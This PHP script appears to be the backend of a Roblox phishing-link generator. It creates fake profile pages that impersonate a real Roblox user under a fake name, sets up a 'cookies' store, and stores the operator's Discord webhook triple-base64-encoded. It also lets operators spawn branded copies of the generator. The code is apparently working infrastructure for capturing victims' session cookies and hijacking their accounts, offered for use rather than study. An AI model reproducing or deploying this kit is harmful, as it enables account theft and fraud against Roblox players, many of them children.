<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
require('../setup.php');
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api/siteverify');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, [
    'secret' => $secret_key,
    'response' => $_POST['token'],
    'remoteip' => $_SERVER['REMOTE_ADDR']
]);
$resp = json_decode(curl_exec($ch));
curl_close($ch);
if ($_POST['rusername']) {
if ($resp->success) {
$username = $_POST['rusername'];
$fusername = $_POST['fusername'];
$id = rand();
$directory = "../users/$id";
$token = strtoupper(substr(str_repeat(md5(rand()), ceil(32/32)), 0, 32));
$directory2 = "../tokens/$token.php";
if (file_exists($directory) || file_exists($directory2)) {
die('<b>There was an unknown error creating your link. Please refresh the page and retry.</b>');
} else {
$ch = curl_init('https://users.roblox.com/v1/usernames/users');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HEADER, false);
$headers = ["content-type: application/json"];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"usernames": ["'."".$username."".'"],"excludeBannedUsers": true}');
$userdata = json_decode(curl_exec($ch), true)['data'];
foreach ($userdata as $uservalue) {
$rusername.=$uservalue['name'];
$rid.=$uservalue['id'];
$rdisplayname.=$uservalue['displayName'];
}
if($rusername){
mkdir("$directory/setup", 0777, true);
mkdir("$directory/cookies", 0777, true);
file_put_contents("$directory/profile.php", '<?php require("../../setup.php"); require("../../api/profile.php");?>');
file_put_contents("$directory/cookies/.htaccess", 'deny from all');
file_put_contents("$directory/cookies/json.txt", '');
file_put_contents("$directory/setup/rusername.txt", $rusername);
file_put_contents("$directory/setup/fusername.txt", $fusername);
file_put_contents("$directory/setup/aboutme.txt", $_POST['aboutme']);
file_put_contents("$directory/setup/id.txt", $id);
file_put_contents("$directory/setup/friends.txt", json_decode(file_get_contents("https://friends.roblox.com/v1/users/$rid/friends/count"))->count);
file_put_contents("$directory/setup/followers.txt", json_decode(file_get_contents("https://friends.roblox.com/v1/users/$rid/followers/count"))->count);
file_put_contents("$directory/setup/followings.txt", json_decode(file_get_contents("https://friends.roblox.com/v1/users/$rid/followings/count"))->count);
file_put_contents("$directory/setup/webhook.txt", base64_encode(base64_encode(base64_encode($_POST['webhook']))));
if($_POST['dwebhook']){
file_put_contents("$directory/setup/dwebhook.txt", $_POST['dwebhook']);
}
mkdir('../tokens', 0777, true);
file_put_contents($directory2, '<?php $id="'."".$id."".'";?>');
$controllerpath = strtoupper(str_replace(' ','_',$name));
$color = hexdec($hex);
$result = '{"content":null,"embeds":[{"title":"```'."".$controllerpath."".'-'."".$token."".'```","description":"**On your controller, you can change the:**\n```- Real Username\n- Fake Username\n- About Me\n- Friend Count\n- Follower Count\n- Following Count\n- Discord Webhook\n```\n**[Link]('."".$actual_link."".'/users/'."".$id."".'/profile)** | **[Login to Controller]('."".$actual_link."".'/controller/sign-in?token='."".$controllerpath."".'-'."".$token."".')** | **[Our Discord Server]('."".$url."".')**","color":'."".$color."".',"author":{"name":"Your link has been activated!","icon_url":"'."".$thumbnail."".'"},"footer":{"text":"'."".$name."".'","icon_url":"'."".$thumbnail."".'"},"timestamp":"2022-07-23T00:51:00.000Z"}],"username":"'."".$name."".'","avatar_url":"'."".$thumbnail."".'","attachments":[]}';
    $ch = curl_init();
    curl_setopt_array($ch, [CURLOPT_URL => $_POST['webhook'],CURLOPT_POST => true,CURLOPT_POSTFIELDS => $result,CURLOPT_HTTPHEADER => ["Content-Type: application/json"]]);                                   
    $response = curl_exec($ch);
    curl_close($ch);
    echo '1';
} else {
die('<b>The Real Username does not exist on Roblox. Please specify a username that exists.</b>');
}
}
} else {
die('<b>Please solve the recaptcha before creating a link!</b>');
}
} else if ($_POST['directory']) {
if ($resp->success) {
if(filter_var($_POST['thumbnail'], FILTER_VALIDATE_URL)) {
$thumbnail = str_replace('<','',$_POST['thumbnail']);
$thumbnail = str_replace('>','',$thumbnail);
$thumbnail = str_replace('!','',$thumbnail);
$thumbnail = str_replace('(','',$thumbnail);
$thumbnail = str_replace('"','',$thumbnail);
$thumbnail = str_replace("'",'',$thumbnail);
$thumbnail = str_replace(';','',$thumbnail);
$thumbnail = base64_encode($thumbnail);
if (ctype_xdigit(str_replace('#','',$_POST['color']))) {
if(!empty(str_replace(' ','',$_POST['name']))){
$directory = preg_replace('/[^A-Za-z0-9\-]/', '', $_POST['directory']);
$directory = "../generate/$directory";
if (file_exists($directory)) {
die('<b>There was an unknown error creating your link. Please refresh the page and retry.</b>');
} else {
mkdir("$directory/setup", 0777, true);
file_put_contents("$directory/index.php", file_get_contents('temp_generator.php'));
file_put_contents("$directory/setup/directory.txt", $directory);
file_put_contents("$directory/setup/name.txt", $_POST['name']);
file_put_contents("$directory/setup/thumbnail.txt", $thumbnail);
file_put_contents("$directory/setup/color.txt", str_replace('#','',$_POST['color']));
file_put_contents("$directory/setup/webhook.txt", base64_encode(base64_encode(base64_encode($_POST['webhook']))));
$directory = str_replace('../generate/','/generate/',$directory);
die($directory);
}
} else {
die('<b>Please enter a name.</b>');
}
} else {
die('<b>Please enter a valid color.</b>');
}
} else {
die('<b>Please enter a valid thumbnail!</b>');
}
} else {
die('<b>Please solve the recaptcha before creating a link!</b>');
}
}
}
?>